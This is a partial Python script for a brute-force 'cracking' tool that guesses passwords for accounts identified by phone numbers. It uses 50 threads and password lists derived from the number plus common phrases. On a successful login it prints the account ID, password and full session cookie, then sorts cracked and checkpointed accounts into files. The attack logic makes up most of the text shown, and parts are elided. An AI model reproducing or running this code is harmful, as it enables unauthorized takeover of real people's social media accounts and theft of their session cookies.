...
\033[1;31m[ \033[1;32mVERSION  \033[1;31m] \033[1;35m<> \033[1;32m 1.0
\033[1;34m───────────────────────────────────────\033[1;37m""")
                                                     \033[1;34m WELL-COME TO MY TOOLS 
...
def fuck():
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        for love in user:
            ...
            pwx = [uid,kod+kode+kode[:1],kod+kode+kodex,kode+kodex+love,kodex+love,'@#@#@#','@@@###','i love you','Bangladesh']
            #pwx =[uid,kodex+love]
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in SIFAT/OK.txt')
    print(' [+] CP Ids saved in SIFAT/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[Mr.SIFAT-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(50*'_')
                print(f"\033[1;92m[Mr.SIFAT-OK] {cid}|{ps} \n [📞] PHONE NUMBER : {uid} \n [🍪] Cookie : {coki}")
                #print(f' Useragent : {pro}')
                #print(f"\033[1;94m[Mr.SIFAT-CP] {cid}|{ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;32m[Mr.SIFAT-CP] {cid}|{ps}")
                #print(f' Useragent : {pro}')
